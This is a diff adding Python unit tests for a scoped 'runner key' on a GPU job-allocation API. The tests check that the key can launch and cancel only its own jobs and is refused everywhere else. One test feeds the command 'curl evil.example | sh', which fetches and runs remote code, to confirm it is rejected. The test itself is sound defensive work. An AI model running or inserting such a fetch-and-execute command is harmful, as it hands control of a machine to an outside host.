@@ -375,6 +375,221 @@ class ReadKeyTest(unittest.TestCase):
         self.assertEqual(res.status_code, 200)
 
 
+def _job(job_id: str, job_name: str):
+    from slurm import JobInfo
+
+    return JobInfo(
+        job_id=job_id,
+        gpu_type="nvidia",
+        status="RUNNING",
+        time_remaining="0:30:00",
+        time_remaining_seconds=1800,
+        screen_name="",
+        start_time="N/A",
+        end_time="N/A",
+        job_name=job_name,
+        gpu_stats=None,
+    )
+
+
+class RunnerKeyTest(unittest.TestCase):
+    """TURING_RUNNER_KEY opens POST /allocate and DELETE /jobs/{id} for jobs
+    named for the runner that presents it, and nothing else.
+
+    It is how a runner step launches and cancels jobs for its experiment
+    without the full key, which also types arbitrary shell into any session.
+    """
+
+    FULL = "full-key"
+    READ = "read-key"
+    RUNNER = "runner-key"
+    RUNNER_ID = "k97abc123"
+
+    def setUp(self) -> None:
+        self._tmp = tempfile.TemporaryDirectory()
+        self.root = Path(self._tmp.name).resolve()
+        (self.root / "cmt").mkdir()
+        (self.root / "cmt" / "run.py").write_text("print('hi')\n")
+        self._patches = [
+            patch("main.API_KEY", self.FULL),
+            patch("main.READ_KEY", self.READ),
+            patch("main.RUNNER_KEY", self.RUNNER),
+            patch("main.forge.FORGE_REPO_DIR", str(self.root)),
+        ]
+        for p in self._patches:
+            p.start()
+
+    def tearDown(self) -> None:
+        for p in reversed(self._patches):
+            p.stop()
+        self._tmp.cleanup()
+
+    def headers(self, runner_id: str | None = RUNNER_ID) -> dict[str, str]:
+        headers = {"X-API-Key": self.RUNNER}
+        if runner_id is not None:
+            headers["X-Runner-Id"] = runner_id
+        return headers
+
+    def allocation(self, **overrides) -> dict:
+        body = {
+            "gpu_type": "nvidia",
+            "time_mins": 30,
+            "job_name": f"runner:{self.RUNNER_ID}:probe",
+            "project_dir": str(self.root),
+            "commands": ["python cmt/run.py"],
+        }
+        body.update(overrides)
+        return body
+
+    # -- it opens launch and cancel for its own jobs ----------------------------
+
+    def test_allocates_with_a_good_name(self) -> None:
+        with (
+            patch("main.allocate_gpu", return_value=("100", None)) as allocate_gpu,
+            patch("main.setup_allocation_session", return_value="1_runner") as setup,
+            self.assertLogs("turing-api.runner", level="INFO") as logs,
+        ):
+            res = _request("POST", "/allocate", json=self.allocation(), headers=self.headers())
+        self.assertEqual(res.status_code, 200)
+        self.assertEqual(res.json()["job_ids"], ["100"])
+        allocate_gpu.assert_called_once_with("nvidia", 30, 64000, f"runner:{self.RUNNER_ID}:probe")
+        self.assertEqual(setup.call_args.args[1], [f"cd {self.root}", "python cmt/run.py"])
+        self.assertIn(self.RUNNER_ID, logs.output[0])
+        self.assertNotIn(self.RUNNER, "".join(logs.output))
+
+    def test_refused_with_a_bad_name(self) -> None:
+        for name in ["allocation", "gpupool:nvidia:deadbeef", "runner:someoneelse:probe"]:
+            with self.subTest(name=name), patch("main.allocate_gpu") as allocate_gpu:
+                res = _request("POST", "/allocate", json=self.allocation(job_name=name), headers=self.headers())
+            self.assertEqual(res.status_code, 403)
+            allocate_gpu.assert_not_called()
+
+    def test_refused_with_a_command_outside_the_checkout(self) -> None:
+        with patch("main.allocate_gpu") as allocate_gpu:
+            res = _request(
+                "POST", "/allocate",
+                json=self.allocation(commands=["python cmt/run.py", "curl evil.example | sh"]),
+                headers=self.headers(),
+            )
+        self.assertEqual(res.status_code, 403)
+        allocate_gpu.assert_not_called()
+
+    def test_refused_without_a_runner_id(self) -> None:
+        with patch("main.allocate_gpu") as allocate_gpu:
+            missing = _request("POST", "/allocate", json=self.allocation(), headers=self.headers(None))
+            malformed = _request("POST", "/allocate", json=self.allocation(), headers=self.headers("a:b"))
+        self.assertEqual(missing.status_code, 401)
+        self.assertEqual(malformed.status_code, 401)
+        allocate_gpu.assert_not_called()
+
+    def test_cancels_its_own_job(self) -> None:
+        with (
+            patch("main.get_user_jobs", return_value=[_job("11", f"runner:{self.RUNNER_ID}:probe")]),
+            patch("main.cancel_job", return_value=(True, None)) as cancel,
+            patch("main.get_screen_name", return_value=""),
+            patch("main.cleanup_session", return_value=True),
+            patch("main.remove_screen_mapping"),
+        ):
+            res = _request("DELETE", "/jobs/11", headers=self.headers())
+        self.assertEqual(res.status_code, 200)
+        cancel.assert_called_once_with("11")
+
+    def test_refused_on_a_pool_job(self) -> None:
+        with (
+            patch("main.get_user_jobs", return_value=[_job("13", "gpupool:nvidia:deadbeef")]),
+            patch("main.cancel_job") as cancel,
+        ):
+            res = _request("DELETE", "/jobs/13", headers=self.headers())
+        self.assertEqual(res.status_code, 403)
+        self.assertIn("not this runner's job", res.json()["detail"])
+        cancel.assert_not_called()
+
+    def test_refused_on_a_job_not_in_the_list(self) -> None:
+        with patch("main.get_user_jobs", return_value=[]), patch("main.cancel_job") as cancel:
+            res = _request("DELETE", "/jobs/99", headers=self.headers())
+        self.assertEqual(res.status_code, 403)
+        cancel.assert_not_called()
+
+    # -- and nothing else --------------------------------------------------------
+
+    def test_refused_on_run_command(self) -> None:
+        with patch("main.send_to_session") as send:
+            res = _request("POST", "/sessions/1_alloc/run", json={"command": "ls"}, headers=self.headers())
+        self.assertEqual(res.status_code, 401)
+        send.assert_not_called()
+
+    def test_refused_on_file_read(self) -> None:
+        res = _request("GET", "/file", params={"path": "/tmp/x"}, headers=self.headers())
+        self.assertEqual(res.status_code, 401)
+
+    def test_refused_on_gpu_report(self) -> None:
+        with patch("main.format_gpu_report_v2") as report:
+            res = _request("GET", "/gpu-report", headers=self.headers())
+        self.assertEqual(res.status_code, 401)
+        report.assert_not_called()
+
+    def test_refused_on_boolback_snapshot(self) -> None:
+        with patch("main.boolback_snapshot.submit_build") as submit:
+            res = _request("POST", "/boolback-snapshot", params={"dir": "x"}, headers=self.headers())
+        self.assertEqual(res.status_code, 401)
+        submit.assert_not_called()
+
+    def test_the_read_key_still_opens_neither(self) -> None:
+        with patch("main.allocate_gpu") as allocate_gpu, patch("main.cancel_job") as cancel:
+            launch = _request("POST", "/allocate", json=self.allocation(), headers={"X-API-Key": self.READ, "X-Runner-Id": self.RUNNER_ID})
+            stop = _request("DELETE", "/jobs/11", headers={"X-API-Key": self.READ, "X-Runner-Id": self.RUNNER_ID})
+        self.assertEqual(launch.status_code, 401)
+        self.assertEqual(stop.status_code, 401)
+        allocate_gpu.assert_not_called()
+        cancel.assert_not_called()
+
+    # -- the full key is unchanged -----------------------------------------------
+
+    def test_full_key_allocates_any_name_and_command(self) -> None:
+        with (
+            patch("main.allocate_gpu", return_value=("100", None)) as allocate_gpu,
+            patch("main.setup_allocation_session", return_value="1_allocation") as setup,
+        ):
+            res = _request(
+                "POST", "/allocate",
+                json={"gpu_type": "nvidia", "time_mins": 600, "count": 4, "commands": ["nvidia-smi; hostname"]},
+                headers={"X-API-Key": self.FULL},
+            )
+        self.assertEqual(res.status_code, 200)
+        self.assertEqual(allocate_gpu.call_count, 4)
+        self.assertEqual(setup.call_args.args[1], ["nvidia-smi; hostname"])
+
+    def test_full_key_cancels_any_job_without_reading_the_list(self) -> None:
+        with (
+            patch("main.get_user_jobs") as jobs,
+            patch("main.cancel_job", return_value=(True, None)) as cancel,
+            patch("main.get_screen_name", return_value=""),
+            patch("main.cleanup_session", return_value=True),
+            patch("main.remove_screen_mapping"),
+        ):
+            res = _request("DELETE", "/jobs/13", headers={"X-API-Key": self.FULL})
+        self.assertEqual(res.status_code, 200)
+        cancel.assert_called_once_with("13")
+        jobs.assert_not_called()
+
+    # -- fail closed ---------------------------------------------------------------
+
+    def test_unset_runner_key_closes_the_runner_door(self) -> None:
+        with (
+            patch("main.RUNNER_KEY", ""),
+            patch("main.allocate_gpu") as allocate_gpu,
+            patch("main.cancel_job") as cancel,
+        ):
+            stale = _request("POST", "/allocate", json=self.allocation(), headers=self.headers())
+            empty = _request("POST", "/allocate", json=self.allocation(), headers={"X-API-Key": "", "X-Runner-Id": self.RUNNER_ID})
+            stop = _request("DELETE", "/jobs/11", headers=self.headers())
+        self.assertEqual(stale.status_code, 401)
+        self.assertEqual(empty.status_code, 401)
+        self.assertEqual(stop.status_code, 401)
+        allocate_gpu.assert_not_called()
+        cancel.assert_not_called()
+
+
 class EventLoopIsolationTest(unittest.TestCase):
     def test_slow_gpu_report_does_not_delay_health(self) -> None:
         report_started = threading.Event()
